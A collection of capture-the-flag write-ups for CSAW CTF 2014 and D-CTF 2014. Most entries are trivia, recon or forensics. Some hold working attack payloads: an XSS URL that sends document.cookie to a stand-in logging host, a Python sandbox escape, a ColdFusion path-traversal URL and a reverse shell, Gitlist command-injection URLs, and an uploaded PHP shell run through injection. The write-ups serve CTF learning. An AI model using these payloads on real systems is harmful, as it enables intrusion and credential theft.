> This is one of those "key" challenges we talked about on the stream. Also, you should just CreateFile and WriteFile to stdout for your shellcode. Anything more complicated is probably blocked by the App Container.
>
> Update: You can use AppJailLauncher to launch `greenhornd.exe` just like the game server does with:
>
> ```
> AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe
> ```
>
> Written by RyanWithZombies
>
> [greenhornd.exe](greenhornd.exe)
> [AppJailLauncher.exe](AppJailLauncher.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <https://hackucf.org/blog/csaw-2014-exploitation-400-greenhornd-exe/>
* <https://gist.github.com/g05u/221b61d13804c5fd87d0>
# CSAW CTF 2014: hashes

**Category:** Web
**Points:** 300
**Description:**

> location, location, location
>
> Chal is very very stable. If you were scanning the site while I was doing dev work your requests are probably being dropped.
>
> <http://54.86.199.163:7878/>
>
> Written by ColdHeat

## Write-up

The linked page uses an old version of the jQuery library (v1.6.1), [which enables an XSS vulnerability when e.g. `$('#' + userContent)` is called](http://bugs.jquery.com/ticket/9521) ([CVE-2011-4969](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969)). The page also contains this script:

```js
$(window).bind( 'hashchange', function(e) {
  $('.image').hide()
  tag = window.location.hash
  $(tag).show()
});
tag = window.location.hash
$(tag).show()
```

This makes it possible to inject arbitrary JavaScript simply by changing the hash in the URL. For example, [`#<img src=/ onerror=alert(1)>`](http://54.86.199.163:7878/) displays an alert box.

The page also features a form that can be used to submit image URLs that will then be visited by a bot. Assuming the bot has special admin privileges on this website, and possibly an interesting cookie, let’s try submitting this URL:

```
http://54.86.199.163:7878/#<img src=/ onerror=location='https://your-site.example.com/log?c='+document.cookie>
```

This redirects the bot to a page under our control, passing along the cookie value. The `log` script is a simple server-side script written in your language of choice that simply writes the `c` URL parameter value to a file, or stores it in a database.

A few moments after submitting the above URL, the bot indeed visits our page, and the logger script logs the cookie:

```
win="flag{these_browser_bots_are_annoying}"
```

The flag is `these_browser_bots_are_annoying`.

## Other write-ups and resources

* <http://zoczus.blogspot.com/2014/09/csaw-ctf-web300-writeup.html>
* <http://tasteless.eu/2014/09/csaw-2014-quals-hashes-web300/>
* <http://blog.squareroots.de/en/2014/09/csaw14-hashes/>
# CSAW CTF 2014: ish

**Category:** Exploitation
**Points:** 300
**Description:**

> This shell sucks
>
> HINT: get the contents of `key`
>
> HINT: The `cat` command is useless
>
> ```bash
> nc 54.208.86.14 9988
> ```
>
> Written by kiwi
>
> [ish](ish)

## Write-up

(TODO)

The flag is `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOXX`.

## Other write-ups and resources

* <http://choppers.pw/posts/2014/09/21/csaw-quals-2014-ish/>
* <http://tasteless.eu/2014/09/csaw-2014-quals-ish-exploitation-300/>
* [Exploit written in Python](https://gist.github.com/zachriggle/3670a74f7f6fd74fdaa5)
* <http://rce4fun.blogspot.de/2014/09/csaw-ctf-2014-ish-exploitation-300.html>
* <https://ctfcrew.org/writeup/78>
* [Chinese](http://ddaa.logdown.com/posts/234516-csaw-ctf-2014-pwn-300-ish)
# CSAW CTF 2014: Julian Cohen

**Category:** Recon
**Points:** 100
**Description:**

> Figure out how to get Julian to go on a date with you.
>
> HINT: Julian uses OkCupid
>
> Written by HockeyInJune

## Write-up

The intended solution was to find [this OkCupid profile](http://www.okcupid.com/profile/TheJulianCohen), which displays the flag `julian_will_not_date_you_sorry`.

During the CTF, a troll [set up another OkCupid profile that was much easier to find](http://www.okcupid.com/profile/hockeyinjune) whose ‘self-summary’ is as follows:

> `flag{flowers_and_wine_will_get_me}`

The CTF organisers counter-trolled by accepting that flag (`flowers_and_wine_will_get_me`) as well.

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-csaw-julian-cohen/>
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-julian-cohen/>
# CSAW CTF 2014: Kevin Chung

**Category:** Recon
**Points:** 100
**Description:**

> Find a picture of me that's from before I was a high school student. Submit the URL to the file on the internet
>
> If you find an alternative to the file I'm thinking of, PM it to me on IRC and I'll consider it but use this site to check if it's right first :)
>
> Written by ColdHeat

## Write-up

One possible solution was <http://www.siths.org/album/48915/23451.jpg> (taken from [the _2007-Freshman Orientation_ album](http://www.siths.org/apps/album/#albumREC_ID=24884&s=0)).

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-csaw-kevin-chung/>
* <https://hackucf.org/blog/csaw-2014-recon-100-kevin-chung/>
# CSAW CTF 2014: Not NYSEC

**Category:** Trivia
**Points:** 10
**Description:**

> This is a type of informal security meetup that has been gaining popularity in different cities over the last several years.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW CTF 2014: Obscurity

**Category:** Forensics
**Points:** 200
**Description:**

> see or do not see
>
> Written by marc
>
> [pdf.pdf](pdf.pdf)

## Write-up

[The provided PDF file](pdf.pdf) contains some hidden text.

One way to get to it is by opening the PDF in your viewer of choice, selecting all of its contents (using `Ctrl` + `A` or `⌘` + `A`), copying it, and then pasting it into your text editor of choice.

Another possible solution is to use the `pdftotext` command-line utility:

```bash
$ pdftotext pdf.pdf

$ strings pdf.txt
flag{security_through_obscurity}
```

The flag is `security_through_obscurity`.

## Other write-ups and resources

* <https://hackucf.org/blog/csaw-2014-forensics-200-obscurity/>
* <http://shankaraman.wordpress.com/2014/09/22/csaw-ctf-2014-forensics-200-obscurity-writeup/>
* <http://hackitta.net/csaw-2014-forensics-200-obscurity/>
* <http://bt3gl.github.io/csaw-ctf-2014-forensics-200-obscurity.html>
* <https://ucs.fbi.h-da.de/writeup-csaw-obscurity/>
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-obscurity/>
# CSAW CTF 2014: pop pop

**Category:** Trivia
**Points:** 10
**Description:**

> This x86 instruction is an alias for pop eip/rip

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW CTF 2014: psifer school

**Category:** Cryptography
**Points:** 200
**Description:**

> There's no heartbleed here. Why don't we use these ciphers?
>
> ```bash
> nc 54.209.5.48 12345
> ```
>
> Written by psifertex

## Write-up

(TO-DO)


## Other write-ups and resources

* [Write-up by @bt3gl](http://bt3gl.github.io/csaw-ctf-2014-cryptography-200.html)
* <https://ucs.fbi.h-da.de/writeup-csaw-psifer-school/>
* [Exploit written in Perl by @dz-coder](https://gist.github.com/anonymous/b16f705b728cbfd8b413)
* [Exploit written in PHP by @stypr](https://www.irccloud.com/pastebin/eZAoqsNy)
# CSAW CTF 2014: pybabbies

**Category:** Exploitation
**Points:** 200
**Description:**

> so secure it hurts
>
> ```bash
> nc 54.165.210.171 12345
> ```
>
> Written by ColdHeat
>
> [pyshell.py](pyshell.py)

## Write-up

[The provided Python script](pyshell.py) is a Python sandbox that disallows the use of the following commands:

```py
banned = [
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]
```

One possible solution is the following:

```python
print(().__class__.__bases__[0].__subclasses__()[40]('./key').read())
```

This prints the contents of the `key` file:

```
flag{definitely_not_intro_python}
```

The flag is `definitely\_not\_intro\_python`.

## Other write-ups and resources

* <http://rotlogix.com/2014/09/22/csaw-exploitation-200-pybabies/>
* <http://evandrix.github.io/ctf/2014-csaw-exploitation-200-pybabbies.html>
* <https://hexplo.it/escaping-the-csawctf-python-sandbox/>
* <http://sugarstack.io/csaw-2014-pybabbies.html>
* [_Escaping Python sandboxes_](https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/)
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-pybabies/>
* <http://bruce30262.logdown.com/posts/234935-csaw-ctf-2014-exploitation-200-pybabbies>
* [Korean](http://hackability.kr/entry/2014CSAWCTF-Pwnable-500-Xorcise)
# CSAW CTF 2014 write-ups

* <https://csawctf.poly.edu/>
* [Scoreboard](https://ctf.isis.poly.edu/scoreboard) or [local alternative for Quals](scoreboard_quals.txt) or [local alternative for Finals](scoreboard_finals.txt)
* CTF VM
 - [CTF VM MIRROR 0](http://captf.com/2014/csaw-quals/) 
 - [CTF VM MIRROR 1](https://isisblogs.poly.edu/2014/10/14/csaw-ctf-2014-vm/) 
 - [CTF VM MIRROR 2](https://ctf.isis.poly.edustatic/uploads/csaw_quals_2014.zip) 
 - [CTF VM MIRROR 3](http://128.238.66.100/csaw_quals_2014.zip)

## Completed write-ups

* [Big Data](big-data)
* [bo](bo)
* [csaw2013reversing2.exe](csaw2013reversing2.exe)
* [dumpster diving](dumpster-diving)
* [eggshells](eggshells)
* [Fluffy No More](fluffy-no-more)
* [Fuzyll](fuzyll)
* [geohot pls](geohot-pls)
* [hashes](hashes)
* [Julian Cohen](julian-cohen)
* [Kevin Chung](kevin-chung)
* [Obscurity](obscurity)
* [pybabbies](pybabbies)
* [Shameless plug](shameless-plug)
* [Twitter will you give me @kchung?](twitter-will-you-give-me-kchung)
* [We don’t know either](we-dont-know-either)
* [weissman](weissman)
* [why not sftp?](why-not-sftp)
* [xorcise](xorcise)

## External write-ups only

* [aerosol can](aerosol-can)
* [cfbsum](cfbsum)
* [Feal](feal)
* [greenhornd](greenhornd)
* [ish](ish)
* [psifer school](psifer-school)
* [s3](s3)
* [saturn](saturn)
* [wololo](wololo)

## Incomplete write-ups

* [Not NYSEC](not-nysec)
* [pop pop](pop-pop)
* [Silk Goat](silk-goat)
# CSAW CTF 2014: s3

**Category:** Exploitation
**Points:** 300
**Description:**

> ```bash
> nc 54.165.225.121 5333
> ```
>
> Written by fuzyll
>
> [s3](s3)

## Write-up

(TODO)

The flag is `SimplyStupidStorage`.

## Other write-ups and resources

* <http://choppers.pw/posts/2014/09/21/csaw-quals-2014-s3/>
* <http://tasteless.eu/2014/09/s3-writeup-csaw-2014-exploiting-300/>
* <http://v0ids3curity.blogspot.in/2014/09/csaw-ctf-quals-2014-s3-exploitation-300.html>
* <https://ctfcrew.org/writeup/77>
* <http://barrebas.github.io/blog/2014/09/25/CSAW-s3/>
* [Exploit written in Python by @ebeip90](https://gist.github.com/ebeip90/c6cb842b66fcc1680ea7)
# CSAW CTF 2014: saturn

**Category:** Exploitation
**Points:** 400
**Description:**

> You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?
>
> ```bash
> nc 54.85.89.65 8888
> ```
>
> Written by crowell
>
> [saturn](saturn)

## Write-up

(TODO)

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/09/csaw14-saturn-writeup.html>
* <http://choppers.pw/posts/2014/09/21/csaw-quals-2014-saturn/>
* <http://digitaloperatives.com/2014/09/22/csaw-ctf-2014-qualification-round-write-up-exploitation-400-saturn/>
* <http://www.spectrix.tn/csaw-ctf-2014-pwn400-saturn-writeup/>
* <http://buffered.io/posts/csaw-2014-saturn/>
* [Exploit written in Python by @ebeip90](https://gist.github.com/ebeip90/7594329043e911e3b2f9)
* <http://bruce30262.logdown.com/posts/234986-csaw-ctf-2014-exploitation-400-saturn>
* <http://rce4fun.blogspot.de/2014/09/csaw-ctf-2014-saturn-exploitation-400.html>
# CSAW CTF 2014: Shameless plug

**Category:** Trivia
**Points:** 10
**Description:**

> This is the name of the new USENIX workshop that featured papers on CTFs being used for education.

## Write-up

Googling for “new USENIX workshop for education” gives `3GSE'14`.

The flag is `3GSE`.

## Other write-ups and resources

* none yet
# CSAW CTF 2014: Silk Goat

**Category:** Web
**Points:** 400 (initially)
**Description:**

> After our last two run-ins with the fbi, we finally realized the problem: bitcoin. Every decentralized system has failed us so far, so I am taking us back to the golden ages. Silk Goat is a publicly visible website, uses a centralized currency, and runs on a single webserver. Try and top that, edward snowden!
>
> Because everything is centralized, I can create money at will. To express my generosity, I've given everyone who registers 100 points to start off with. Unlike the shitty first two versions of Silk Road, I've written everything from scratch WITHOUT the help of stack overflow. Now we are hacker-proof 8}
>
> FUCK THE POLICE
>
> <http://54.165.148.27:5000>
>
> HINT: Think about concurrency
>
> All these servers are running the same challenge: <http://54.165.148.27:5001/> <http://54.165.148.27:5002/> <http://54.165.148.27:5003/> <http://54.165.130.222:5001/> <http://54.165.130.222:5002/> <http://54.165.130.222:5003/>
>
> PROTIP: Registering accounts in bulk is not anywhere near the solution.
>
> Written by ancat
>
> **Update:** This challenge is deemed broken. It is left up for you to keep playing with :)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CSAW CTF 2014: Twitter will you give me @kchung?

**Category:** Trivia
**Points:** 10
**Description:**

> This is the Twitter handle of the student who runs CSAW CTF.

## Write-up

At the judges page, under Kevin Chung’s bio it mentioned his Twitter handle. The answer is `poopsec`.

## Other write-ups and resources

* none yet
# CSAW CTF 2014: We don’t know either

**Category:** Trivia
**Points:** 10
**Description:**

> On this day in November, the CSAW Career Fair takes place in Brooklyn, New York.

## Write-up

The expected solution was `14`. See <https://csaw.isis.poly.edu/careerfair> and <http://www.eventbrite.com/e/csaw-registration-tickets-12262823435>.

## Other write-ups and resources

* none yet
# CSAW CTF 2014: weissman

**Category:** Reverse Engineering
**Points:** 300
**Description:**

> Extract the key!
>
> Written by RyanWithZombies
>
> Update: The key is not `flag{ don't trust the Cheshire cat!! he works for the Queen of Hearts }`. Sorry about that. It's an artifact from an easier version of this challenge. You need to extract `key.jpg`.
>
> HINT:
>
> CSAWLZ is a completely custom format! You won't find decompressing tools on the internet. We made it just for you. :)
>
> ```c
> typedef struct _hdr {
>     uint8_t magic[8];
>     uint32_t version;
>     uint32_t num_files;
> } hdr;
>
> typedef struct _entry {
>     uint32_t magic;
>     uint32_t compressed_size;
>     uint32_t uncompressed_size;
>     uint8_t filename[32];
> } entry;
> ```
>
> [weissman.csawlz](weissman.csawlz)

## Write-up

Here is a [Java-based solution](CSAWlz.java) to this challenge.

During the CTF, it seems that most (probably all) of the people who solved it, didn’t completely decompress the files contained within the archive, but were able to get the important file (`key.jpg`) readable enough simply by filling the space required with zeros, as described in the link below.

After the CTF was complete, I asked to author (RyanWithZombies) if he was going to do a write-up, but he said he wasn’t and linked me to the C++ source he used to compress the archive (https://gist.github.com/withzombies/909b403852ea1e31f553). I was able to port the decompressing and hashing code to Java and incorporate it into the code I wrote during the CTF. Our team didn’t actually get the key in time (oh well) but I was interested enough to keep poking at this until I got it to work.

Roughly, the process of extracting a single file is this:

- first, create a _hashmap_ to store uncompressed data blocks
- read the first byte from the _input_, which is a _control byte_

Then in a loop, do this:

- `control_byte >> 1`  to extract the _size_ of the current data block
- `control_byte & 0b00000001) != 0b00000001` to determine if the block is `compressed` or not (if the statement evaluates to `true`, the block is compressed)

If the block is not `compressed`:

- read `size` number of bytes from the `input` and store them in a `buffer`.
- create a `hash` of the first 4 bytes in the buffer
- store the buffered bytes in the `hashmap` using the `hash` as the key
- write the `buffer` to `output`
- read the next `control_byte` if it exists and restart the loop

If the block is _compressed_:

- read two bytes from the `input`; these bytes are the `hash`
- using the `hash` as the key, get the bytes stored in the `hashmap`
- read `size` number of bytes from the bytes you just retrieved from the hashmap into a `buffer`
- write the bytes in the `buffer` to the `output`
- read the next `control_byte` if it exists and restart the loop

When you find that the next `control_byte` doesn’t exist, you are done and can write the `output` to disk.

As stated, this is a very rough outline of what is actually going on — check out the [`CSAWlz.java`](CSAWlz.java) file for a better understanding of exactly what happens during decompressing.

Thanks to RyanWithZombies for an interesting challenge!

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/09/csaw14-weissman-writeup.html>
# CSAW CTF 2014: why not sftp?

**Category:** Forensics
**Points:** 200
**Description:**

> well seriously, why not?
>
> Written by marc
>
> [traffic-5.pcap](traffic-5.pcap)

## Write-up

Open [the provided `traffic-5.pcap` file](traffic-5.pcap) in Wireshark.

There are various ways to look for interesting packets:

1. Go to _Statistics_ → _Conversations_ and look for interesting traffic patterns. Or, alternatively…

2. Go to _Edit_ → _Find Packet_ → _String_ → _Search in packet bytes_, and enter `flag`. Or, alternatively…

3. The challenge name hints at FTP usage, so let’s filter the packet captures over the FTP-DATA protocol by typing `ftp-data` into the filter box. Click the capture labeled number `413`.

Right-click the capture and select _Follow TCP Stream_. Notice how the first few bytes match the file header for ZIP files (`PK\x03\x04`).

To extract this ZIP file from the PCAP file, click the `Save As` button at the bottom, and save it somewhere as a `*.zip` file. Unzip the file however you want and open the `flag.png` inside. It displays:

```
flag{91e02cd2b8621d0c05197f645668c5c4}
```

The flag is `91e02cd2b8621d0c05197f645668c5c4` (which, by the way, happens to be the MD5 hash of the string `network`).

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---why-not-sftp-200pts-writeup>
* <http://shankaraman.wordpress.com/2014/09/22/csaw-ctf-2014-forensics-200-why-not-sftp-writeup>
* <http://bt3gl.github.io/csaw-ctf-2014-forensics-200-why-not-sftp.html>
* <https://ucs.fbi.h-da.de/writeup-csaw-why-not-sftp/>
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-why-not-sftp/>
* <https://github.com/hackerclub/writeups/blob/master/csaw-2014/why-not-sftp/WRITEUP-clampz.md>
# CSAW CTF 2014: wololo

**Category:** Reverse Engineering
**Points:** 300
**Description:**

> ```bash
> nc 54.164.98.39 2510
> ```
>
> Written by RyanWithZombies
>
> Hint:
>
> ```c
> typedef struct
> {
>         uint32_t magic;
>         uint32_t version;
>         uint16_t num_cols;
>         uint16_t num_rows;
> } header_t;
>
> typedef struct
> {
>         uint8_t type;
>         char name[16];
> } col_t;
>
> /*
>  * Column types:
>  *   * 0 = 8bit integer
>  *   * 1 = 16bit integer
>  *   * 2 = 32bit integer
>  *   * 3 = 64bit integer
>  *   * 4 = 8byte string
>  *   * 5 = 16byte string
>  *   * 6 = 32byte string
>  *   * 7 = unix timestamp encoded as a 32bit integer
>  *
>  */
> ```
>
> [wololo.lst.xz](wololo.lst.xz)

## Write-up

Let’s run the command provided in the challenge description.

```bash
$ nc 54.164.98.39 2510

I'm ready to accept your input file!

Run this with: python wololo_x.py hostname port file_to_submit

#!/usr/bin/env python

import sys, socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
print s.recv(1024)

contents = open(sys.argv[3], "rb").read()
s.send(struct.pack("<I", len(contents)) + contents)

print "The challenge server says: ", s.recv(1024)
```

Okay, let’s store the above Python script to [a file named `wololo_x.py`](wololo_x.py) and try to submit a random test file to the server:

```bash
$ python wololo_x.py 54.164.98.39 2510 some-random-test-file
```

The server responds:

```
The challenge server says:  Sorry, your file did not pass all the checks.
```

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/09/csaw-2014-quals-wololo-rev300/>
* [Exploit written in Python by @ebeip90](https://gist.github.com/ebeip90/d167b9a52cb55fbffeb2#file-wololo-py)
# CSAW CTF 2014: xorcise

**Category:** Exploitation
**Points:** 500
**Description:**

> ```bash
> nc 128.238.66.227 24001
> ```
>
> Written by raid
>
> [xorcise](xorcise)
> [xorcise.c](xorcise.c)

## Write-up

This is a somewhat detailed write-up by Xor0X from team [HacknamStyle](http://www.hacknamstyle.net/).

### Length checking vulnerabilities: Part One

By inspecting [the source code](xorcise.c) we see the binary is a service which listens on port 24001. New clients are handled in `int process_connection(int sockfd)`. This function reads one single packet, which is expected to be in the following format:

	struct cipher_data {
		/** Header: Unencrypted and unauthenticated */
	    uint8_t length; /** Length of the bytes array */
	    uint8_t key[8];
		/** Payload: Encrypted and (partly) authenticated */
	    uint8_t bytes[128];
	};

As the comments indicate, the header is sent unencrypted. In particular this header includes an 8-byte key (which is chosen by the client). Roughly speaking the `bytes` array is XORed with the key in blocks of 8 bytes. The function doing this decryption is `decipher(data, output)`, which will be investigated in more detail later on (because it contains a vulnerability). The `length` field the header contains the actual size of the `bytes` array. This must be smaller or equal to 128. An attempt is made to assure the given length is valid:

    cipher_data encrypted;
    ssize_t bytes_read = recv(sockfd, (uint8_t *)&encrypted, sizeof(encrypted), 0);
    if (encrypted.length > bytes_read)
        return -1;

However this check is flawed. **Variable `bytes_read` is the length of the packet including the header**, while the program will treat the `length` field as the size of the `bytes` array. This means that as an attacker we can force the length to be bigger than 128.

The second vulnerability is in `decipher(data, output)`. This function decrypts the `bytes` array using the key. Somewhat simplified we have the following code:

	uint32_t decipher(cipher_data *data, uint8_t *output)
	{
	    uint8_t buf[MAX_BLOCKS * BLOCK_SIZE];
	    uint32_t loop, block_index;

	    memcpy(buf, data->bytes, sizeof(buf));

	    if ((data->length / BLOCK_SIZE) > MAX_BLOCKS)
	        data->length = BLOCK_SIZE * MAX_BLOCKS;

		// Block-decryption loop
	    for (loop = 0; loop < data->length; loop += 8)
	        for (block_index = 0; block_index < 8; ++block_index)
	            buf[loop+block_index] ^= (0x8F ^ data->key[block_index]);

	    memcpy(output, buf, sizeof(buf));
	}

Note that `data->bytes` is copied to a local buffer, and this local buffer is then processed. The first if-test is an attempt to assure that `data->length` is not bigger than the local buffer. However this checked is flawed because in **`(data->length / BLOCK_SIZE)` the intermediate result will be rounded down**. In particular, the following value will pass the length check:

	data->length = BLOCK_SIZE * MAX_BLOCKS + (BLOCK_SIZE - 1) = 135

And due to the first length check vulnerability, we know that `data->length` can indeed contain such values. The consequence of both vulnerabilities means that we can force the block-decryption loop to **decrypt an extra block of 8-bytes**. Since the local buffer is too small for this, we are capable of modifying local variables placed after the buffer. In particular we can overwrite `loop` and `block_index`.

### Length checking vulnerabilities: Part Two?

Interestingly, `decipher(data, output)` is the only function that uses the `length` field in the header. All other functions are coded in such a way that knowing this length is not required. This causes another peculiar observation: when setting `length` to zero, no decryption takes place, and the packet is processed as-is. This observation is not required to solve the challenge though (but it does make it easier to construct packets).

### Authentication and Commands

The above two vulnerabilities [are sufficient](https://gist.github.com/g05u/9e1ae04ad1252f709bb7) to exploit the challenge. However we had some problems doing this, and instead opted for another approach. Our approach relies on additional functionality of the challenge: letting it execute commands. We can execute three commands: (1) getting the current server time; (2) reading an arbitrary file; (3) executing a system command. The latter two commands required the packet to be authenticated. The client must provide a checksum equal to `H(H(password||key) || H(data||password))` for the packet to be authenticated. Here `password` is a secret loaded at startup, and `key` and `data` are chosen by the client. The function `H()` seems to be a custom (and insecure?) hash function.

### Exploitation

We use both length-check vulnerabilities to read the secret `password`. Once we have this, we can execute arbitrary system commands on the server, and exploitation becomes trivial.

In the `decipher(data, output)` function we overwrite the return address. This is done by first overwriting the local variable `loop`, such that the next xor-decrypt operation will point to the return address. We prevent other variables from being overwritten by XORing with zero. Recall that we can XOR 8 bytes in total, and in particular we XOR these bytes with the `key` in the header of the packet.


Where will we point the return address to? First observe that, because of the last `mempcy` call, the `eax` register contains a pointer to the local buffer when returning from the function. Hence the content pointed to by `eax` is under our control. If we now exploit the binary for interesting gadgets, we spot the following:

	.text:08049290                 mov     eax, [ebp+packet]
	.text:08049293                 add     eax, 8
	.text:08049296                 sub     esp, 8
	.text:08049299                 push    eax             ; filename
	.text:0804929A                 push    [ebp+fd]        ; fd
	.text:0804929D                 call    read_file

This is the code that calls `read_file(sockfd, name)`. When returning from `decipher` the `ebp` register is restored, hence it correctly points to the local variables. However, variable `packet` is not yet initialized by the program, hence we can't use it. Instead we redirect code to `push eax; push [ebp+fd]`. Since `eax` points to the beginning of the buffer this code will successfully be executed. Putting the string `password.txt` in the start of the buffer will now make the service print out the password **pass123**. We can now send authenticated commands and execute arbitrary shell commands. The flag was in the file `flag.txt` in the same directory as `password.txt` (i.e. the current working directory).

Remark: the problem we encountered when directly calling `system(cmd)` was that it would overwrite the local buffer used in `decipher` (since it was saved on the stack). Recall that the pointer to this buffer was stored in `eax`. Luckily, in the `read_file` function, the stack is used in such a way so this didn't occur.

## Other write-ups and resources

* [Mirror of the above write-up by Mathy](http://www.mathyvanhoef.com/2014/09/csaw-2014-xorcise-challenge.html)
* [Write-up by ekse](http://solution-36.blogspot.com/2014/09/csaw-2014-exploit-500-writeup-xorcise.html)
* [Write-up by tasteless](http://tasteless.eu/2014/09/xorcise-csaw-2014-exploiting-500/)
* [Excellent PoC by Henry Sanchez](https://gist.github.com/g05u/9e1ae04ad1252f709bb7)
* <https://ctfcrew.org/writeup/69>
* [Korean](http://hackability.kr/entry/2014CSAWCTF-Pwnable-500-Xorcise)
# D-CTF 2014: Bonus 100 – Shelling

**Category:** Bonus
**Points:** 100
**Description:**

> 10.13.37.89. Good luck!

## Write-up

```
13:41:38 <ccm> sigsegv, remote command execution on second server which can be used to execute a script in the shared uploads folder and backconnect to your machine
13:41:55 <@Andrei> <ccm> gnomus, basically: http://ip/api.php?apikey=bla&type=wc&file=`php uploads/sploit.jpg`
13:41:55 <@Andrei> <fox> gnomus, also the rce was triggerable only with a curl from the first box
```

The website at `http://10.13.37.89/` contains a form that allows file uploads. Files are uploaded to the `uploads` directory, but only files with safe extensions are allowed.


The trick was to create a PHP shell e.g. `shell.php`, rename it to `shell.jpg`, then upload it.

There was a second vulnerability in the website that allowed remote code execution

http://10.13.37.89/api.php?apikey=bla&type=wc&file=`php uploads/shell.jpg`

(TODO)

## Other write-ups and resources

* none yet
# D-CTF 2014: Bonus 200 – Final

**Category:** Bonus
**Points:** 200
**Description:**

> This is the final problem. Enjoy! 10.13.37.113

## Write-up

(TODO)

## Other write-ups and resources

* <https://hackucf.org/blog/d-ctf-2014-bonus-200/>
# D-CTF 2014: Exploit 100 – Nuclear

**Category:** Exploit
**Points:** 100
**Description:**

> 1947-1991 / 10.11.1.2. Don't forget to switch the VPN server.

## Write-up

Exploit the local path inclusion vulnerability in the ColdFusion admin panel:

```
http://10.11.1.2/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

This gets you an MD5 hash, which is the hash of the password `~Coldfusion`.

Now you can use the ColdFusion admin panel to add a ‘scheduled task’ to fetch your JSP/PHP/CFM shell and put it in a web-exposed directory. We used [a simple reverse shell](http://pastebin.com/09gpcxWL) in combination with `nc -v -n -l -p 4444`.

Once you have a shell, start digging. The flag is in `C:\Documents and Settings\admin\Desktop\paranoia.jpg` and looks like this:

![](paranoia.jpg)

The file name hints at [`paranoia.jar`](https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/) which is a steganography tool. Using that tool (or another stenography tool) with the provided image and the key `That's the most evilest thing I can imagine.` we find the flag:

```
The Cold War is over but Cold War thinking survives.
```

## Other write-ups and resources

* none yet
# D-CTF 2014: Exploit 200 – Boss

**Category:** Exploit
**Points:** 200
**Description:**

> Find the boss.
>
> **Hint:** `libranet.php`
>
> **Hint:** Bio and his blog are the starting point.
>
> **Hint:** Start with recon / Boss is the CTF founder. Later, have fun!

## Write-up

The ‘boss’ or at least the main organizer of this CTF is [Andrei Avădănei](https://www.worldit.info/despre-avadanei-andrei/). [His LinkedIn profile](https://www.linkedin.com/in/andreiavadanei) indicates he’s the founder of [the Cyber Security Research Center in Romania](http://ccsir.org/). The source of their home page contains the following HTML comment:

```html
<!-- You are getting closer to me, but you need to make some more research regarding several tools that are public around the web. Please, KISS!  btw: 10.13.37.32
--!>
```

(TODO)

## Other write-ups and resources

* none yet
# D-CTF 2014: Exploit 300 – People say…

**Category:** Exploit
**Points:** 300
**Description:**

> People say that if you're still angry at 80, you're not an angry young man, just a grumpy old git. 10.13.37.33
>
> **Hint:** gitlist.

## Write-up

Taking the hint, we navigate to `http://10.13.37.33/gitlist/` which hosts a [Gitlist](http://gitlist.org/) instance. Older versions of Gitlist are [vulnerable to remote command execution](http://hatriot.github.io/blog/2014/06/29/gitlist-rce/). Let’s try executing `ls -al` on the target server:

```
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60
```

It works! After some recon work, we find a file named `e3.flag` in the server root. Let’s view its contents using the following payload:

```
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60cat%20%2Fe3.flag%60
```

The result is:

```
stupid psychopathic git.
```

This is the flag.

## Other write-ups and resources

* none yet
# D-CTF 2014: Exploit 400 – Paranormal Activity

**Category:** Exploit
**Points:** 400
**Description:**

> You can’t kill a ghost!
>
> **Hint:** You need to own Exploit 3.

## Write-up

(TODO)

## Other write-ups and resources

* <https://hackucf.org/blog/d-ctf-2014-exploit-400-paranormal-activity/>
# D-CTF 2014: Misc 100 – SE FTW

**Category:** Misc
**Points:** 100
**Description:**

> In two words describe social engineering!
>
> **Hint:** 2f722f6e6574736563

## Write-up

Since the hint consists of hexadecimal digits only, let’s try to decode it:

```bash
$ xxd -r -p <<< 2f722f6e6574736563
/r/netsec
```

[/r/netsec](https://www.reddit.com/r/netsec) is a subreddit where information security news is discussed. In its sidebar contains a bunch of links, including this one:

> /r/SocialEngineering - Free Candy

The flag is `free candy`.

## Other write-ups and resources

* none yet
# D-CTF 2014: Misc 200 – A conjecture

**Category:** Misc
**Points:** 200
**Description:**

> Prove every bipartite polyhedral graph with three edges per vertex has a Hamiltonian cycle.

## Write-up

[Barnette’s conjecture](https://en.wikipedia.org/wiki/Barnette's_conjecture) is an unsolved problem. The flag is `unsolved problem`.

## Other write-ups and resources

* none yet
# D-CTF 2014: Misc 300 – LooL

**Category:** Misc
**Points:** 300
**Description:**

> ![](lol.jpg)

## Write-up

For this challenge, only an image is provided. However, inspecting the challenge page’s source code, we find this HTML comment:

```html
